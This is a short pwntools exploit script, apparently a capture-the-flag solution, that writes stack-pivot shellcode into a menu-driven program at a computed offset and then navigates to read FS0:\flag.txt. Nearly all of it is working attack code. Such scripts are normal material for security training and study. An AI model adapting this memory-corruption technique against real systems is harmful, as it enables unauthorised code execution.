from pwn import *

context.arch = "amd64"
shellcode = asm(
"""
    add rsp, 0x188
    pop rbx
    pop rbp
    pop rdi
    pop rsi
    pop r12
    pop r13
    pop r14
    pop r15
    ret
"""
) + b"UNVARIANT"

BASE = 0x2183013 - 0x1013
offset = BASE + 0x128a
log.info(f"{offset = :#x}")

if args.REMOTE:
    p = remote("localhost", 1337)
else:
    p = process("./run.sh")

p.recvuntil(b"==[ Menu")
p.sendafter(b": ", b"1\r")

size = offset + len(shellcode)
shellcode = shellcode.hex().upper().encode()
print(shellcode)

p.sendafter(b": ", f"{size}".encode() + b"\r")
p.sendafter(b": ", b"4\r")
p.sendafter(b": ", b"0\r")
p.sendafter(b": ", f"{offset - 1}".encode() + b"\r")
p.sendafter(b": ", shellcode + b"ZZ")

p.recvuntil(b"current system")

p.send(b"\x1b[B" * 2)
p.send(b"\r")
p.send(b"\x1b[B")
p.send(b"\r")
p.send(b" ")
p.send(b"type FS0:\\flag.txt\r")

p.interactive()
